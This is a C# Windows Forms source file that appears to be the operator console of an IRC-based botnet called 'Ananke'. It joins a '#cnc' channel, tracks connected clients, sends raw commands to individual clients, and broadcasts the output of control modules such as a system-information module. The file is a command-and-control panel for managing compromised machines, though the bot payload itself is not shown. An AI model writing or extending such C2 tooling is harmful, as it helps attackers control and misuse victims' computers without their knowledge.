using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Ananke.Modules;
using IRCLib;
using Message = IRCLib.Data.Message;

namespace Ananke {
    public partial class MainForm : Form {
        private Client _ircClient;
        private readonly Dictionary<string, IControlModule> _modules = new Dictionary<string, IControlModule>(); 

        public MainForm() {
            InitializeComponent();
        }

        public void ConsoleLog(string text) {
            if(txtConsole.InvokeRequired) {
                Invoke((MethodInvoker)delegate {
                    ConsoleLog(text);
                });
            } else {
                txtConsole.AppendText(text);
            }
        }

        public void RegisterModule(IControlModule module) {
            _modules[module.Identifier] = module;

            lstModules.Items.Add(module.Identifier);
        }

        private void MainForm_Load(object sender, EventArgs e) {
            ConnectForm dialog = new ConnectForm();

            if(dialog.ShowDialog() == DialogResult.OK) {
                RegisterModule(new SysInfoModule());

                _ircClient = new Client(dialog.Host, new User("admin"));

                _ircClient.RawMessageSent += (o, args) => ConsoleLog(">> " + args.Message + "\n");
                _ircClient.RawMessageReceived += (o, args) => ConsoleLog("<< " + args.Message + "\n");

                _ircClient.SetHandler("001", OnServerReady);
                _ircClient.SetHandler("353", OnNamesReceived);
                _ircClient.SetHandler("JOIN", OnUserJoin);
                _ircClient.SetHandler("QUIT", OnUserQuit);

                _ircClient.Connect();
            } else {
                Application.Exit();
            }
        }

        private void OnServerReady(Client client, Message message) {
            client.SendRaw("JOIN #cnc");
        }

        private void OnUserQuit(Client client, Message message) {
            Invoke((MethodInvoker)delegate {
                string name = message.Source.Name;
                lstClients.Items.Remove(name);
            });
        }

        private void OnUserJoin(Client client, Message message) {
            Invoke((MethodInvoker)delegate {
                string name = message.Source.Name;
                if(!lstClients.Items.Contains(name)) {
                    lstClients.Items.Add(name);
                }
            });
        }

        private void OnNamesReceived(Client client, Message message) {
            Invoke((MethodInvoker)delegate {
                lstClients.Items.Clear();
                string[] users = message.Parameters.Last().Split(' ');
                lstClients.Items.AddRange(users);
            });
        }

        private void textBox2_KeyPress(object sender, KeyPressEventArgs e) {
            if(e.KeyChar == (char)Keys.Enter) {
                _ircClient.SendRaw(textBox2.Text);
                textBox2.Text = "";
                e.Handled = true;
            }
        }

        private void btnActivateModule_Click(object sender, EventArgs e) {
            IControlModule module;
            if (_modules.TryGetValue(lstModules.SelectedItems[0].Text, out module)) {
                string result = module.Activate();
                if (result != null) {
                    _ircClient.SendRaw("PRIVMSG {0} :{1}", "#cnc", result);
                }
            } else {
                ConsoleLog("failed to find module");
            }
        }

        private void lstModules_SelectedIndexChanged(object sender, EventArgs e) {
            if(lstModules.SelectedItems.Count == 1) {
                btnActivateModule.Enabled = true;
                // enable other buttons etc
            } else {
                btnActivateModule.Enabled = false;
            }

        }

        private void lstClients_MouseDoubleClick(object sender, MouseEventArgs e) {
            int index = lstClients.IndexFromPoint(e.Location);
            if(index != ListBox.NoMatches) {
                textBox2.Text = String.Format("PRIVMSG {0} :", lstClients.Items[index]);
                textBox2.Focus();
            }
        }
    }
}
